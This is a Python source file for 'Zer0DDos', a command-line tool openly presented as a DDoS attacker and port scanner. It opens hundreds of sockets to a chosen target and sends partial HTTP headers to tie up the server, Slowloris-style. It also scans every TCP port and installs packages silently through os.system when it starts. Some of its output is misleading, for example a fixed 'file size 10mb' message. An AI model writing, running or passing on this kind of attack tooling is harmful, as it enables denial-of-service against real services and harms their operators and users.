#!/usr/bin/env python3

import re
import os
import sys
import time
import string
import signal
import socket
import http.client
import urllib.parse
import ssl
from random import choice, randint
from socket import AF_INET, SOCK_STREAM, IPPROTO_TCP
from threading import Thread, Lock
from argparse import ArgumentParser, RawTextHelpFormatter

# Additional libraries for monitoring
import ping3
import psutil

# Check and install pip requirements
def install_requirements():
    requirements = ["requests", "colorama", "termcolor", "ping3", "psutil"]
    for requirement in requirements:
        try:
            __import__(requirement)
        except ImportError:
            os.system(f"pip install {requirement}")
            print(f"[+] Installed {requirement}")

install_requirements()

import requests
import colorama
from termcolor import colored, cprint

if os.name == 'nt':
    colorama.init()

version = '1.0'
title = '''
\033[91m
███████╗███████╗██████╗░░█████╗░██████╗░██████╗░░█████╗░░██████╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝█████╗░░██████╔╝██║░░██║██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║██║░░██║██║░░██║██║░░██║░╚═══██╗
███████╗███████╗██║░░██║╚█████╔╝██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
\033[0m

\033[32m Zer0DDos: A DDoS Python Script and Port Scaning ;)
 Author: \033[92mZer0sec and anonym0977\033[0m
 Github: \033[94mhttp://github.com/zer0sec/zer0ddos\033[0m
 Version: ''' + version + '''
\033[0m
'''

signal.signal(signal.SIGFPE, signal.SIG_DFL)

# Function to generate a fake IP address
def fake_ip():
    while True:
        ips = [str(randint(0, 255)) for _ in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

# Function to check and resolve target IP address
def check_tgt(target):
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror as e:
        print(f"[-] Cannot resolve hostname '{target}': {e}")
        sys.exit(1)
    return ip

# Function to find open ports on a target IP address
def find_open_ports(target):
    open_ports = []
    try:
        print(f"[+] Scanning open ports on {target}...")
        for port in range(1, 65536):  # Scan ports from 1 to 65535
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port}: Open")
            sock.close()
            progress = (port / 65535) * 100
            print(f"\r[+] Progress: {progress:.2f}%", end='', flush=True)
    except KeyboardInterrupt:
        sys.exit(cprint('\n[-] Canceled by user', 'red'))
    except socket.error as e:
        print(f"[-] Error: {e}")
    print("\n[+] Scan finished.")
    return open_ports

# Function to load user agents from file
def add_useragent():
    try:
        with open("./ua.txt", "r") as fp:
            uagents = re.findall(r"(.+)\n", fp.read())
    except FileNotFoundError:
        cprint('[-] No file named \'ua.txt\', failed to load User-Agents', 'yellow')
        return []
    return uagents

# Function to add bot URLs
def add_bots():
    bots = []
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep, proxy=None):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0
        self.proxy = proxy

    def mypkt(self):
        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
               'Host:' + self.tgt + '\r\n' + \
               'User-Agent:' + choice(add_useragent()) + '\r\n' + \
               'Content-Length: 42\r\n'
        pkt = text.encode('utf-8')
        return pkt

    # Method to build a socket and monitor ping and data transfer
    def building_socket(self):
        try:
            sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            if self.proxy:
                sock.connect(self.proxy)
            else:
                sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.send(self.mypkt())
                self.pkt_count += 1
                self.monitor_ping()  # Monitor ping after sending packet
                self.monitor_data_transfer()  # Monitor data transfer
                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
        except Exception as e:
            print(e)
            sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            if self.proxy:
                sock.connect(self.proxy)
            else:
                sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            self.pkt_count += 3
            if sock:
                sock.send(self.mypkt())
                self.pkt_count += 1
                self.monitor_ping()  # Monitor ping after sending packet
                self.monitor_data_transfer()  # Monitor data transfer
                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    # Method to send packets and monitor ping and data transfer
    def sending_packets(self):
        try:
            sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            if self.proxy:
                sock.connect(self.proxy)
            else:
                sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendall(b'X-a: b\r\n')
                self.pkt_count += 1
                self.monitor_ping()  # Monitor ping after sending packet
                self.monitor_data_transfer()  # Monitor data transfer
                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
        except Exception as e:
            print(e)
            sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            if self.proxy:
                sock.connect(self.proxy)
            else:
                sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            if sock:
                sock.sendall(b'X-a: b\r\n')
                self.pkt_count += 1
                self.monitor_ping()  # Monitor ping after sending packet
                self.monitor_data_transfer()  # Monitor data transfer
                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    # Method to monitor ping to target
    def monitor_ping(self):
        try:
            ping_time = ping3.ping(self.tgt)
            if ping_time is not None:
                print(f"[+] Ping Time to {self.tgt}: {ping_time:.2f} ms")
            else:
                print(f"[-] Could not ping {self.tgt}")
        except Exception as e:
            print(f"[-] Ping failed: {str(e)}")

    # Method to monitor data transfer
    def monitor_data_transfer(self):
        try:
            net_interfaces = psutil.net_if_addrs()
            for interface_name, interface_addresses in net_interfaces.items():
                for address in interface_addresses:
                    if 'wlan' in interface_name.lower():  # Replace with your network interface name
                        network_info = psutil.net_io_counters(pernic=True)
                        if interface_name in network_info:
                            bytes_sent = network_info[interface_name].bytes_sent
                            print(f"[+] Data Sent on {interface_name}: {bytes_sent / (1024*1024):.2f} MB")
                        else:
                            print("[-] Unable to fetch network data")
        except Exception as e:
            print(f"[-] Data transfer monitoring failed: {str(e)}")

    # Method to perform the attack
    def doconnection(self):
        socks = 0
        fail = 0
        lsocks = []
        lhandlers = []
        cprint('\t\tBuilding sockets', 'blue')
        while socks < (int(self.threads)):
            try:
                sock = self.building_socket()
                if sock:
                    lsocks.append(sock)
                    socks += 1
                    if socks > int(self.threads):
                        break
            except Exception as e:
                print(e)
                fail += 1
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user', 'red'))
        cprint('\t\tSending packets', 'blue')
        while socks < int(self.threads):
            try:
                handler = self.sending_packets()
                if handler:
                    lhandlers.append(handler)
                    socks += 1
                    if socks > int(self.threads):
                        break
                else:
                    pass
            except Exception as e:
                print(e)
                fail += 1
            except KeyboardInterrupt:
                break
                sys.exit(cprint('[-] Canceled by user', 'red'))
        time.sleep(self.sleep)

# Command line argument parsing
def parse_arguments():
    parser = ArgumentParser(description=title, formatter_class=RawTextHelpFormatter)
    parser.add_argument('-d', metavar='TARGET', help='Target to attack')
    parser.add_argument('-p', metavar='PORT', default='80', help='Target\'s port to attack')
    parser.add_argument('-t', metavar='TIMEOUT', default='15', help='Timeout for connection (Default: 15)')
    parser.add_argument('-s', metavar='SLEEP', default='0.03', help='Time to sleep between each thread')
    parser.add_argument('-T', metavar='THREADS', default='400', help='Number of threads (Default: 400)')
    parser.add_argument('--scan-ports', action='store_true', help='Scan open ports on the target')
    return parser.parse_args()

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write(title)
    args = parse_arguments()

    if not args.d:
        sys.exit(cprint('[-] Please specify a target using -d option', 'red'))

    if args.scan_ports:
        target = args.d
        ip = check_tgt(target)
        open_ports = find_open_ports(ip)
        if open_ports:
            print(f"[+] Open ports on {target}: {open_ports}")
        else:
            print(f"[-] No open ports found on {target}")

    else:
        tgt = check_tgt(args.d)
        threads = int(args.T)
        cprint(f'\n[+] Attack on {tgt} on port {args.p} with {args.T} threads\n', 'blue')
        d = Pyslow(tgt, args.p, float(args.t), threads, float(args.s))
        d.doconnection()
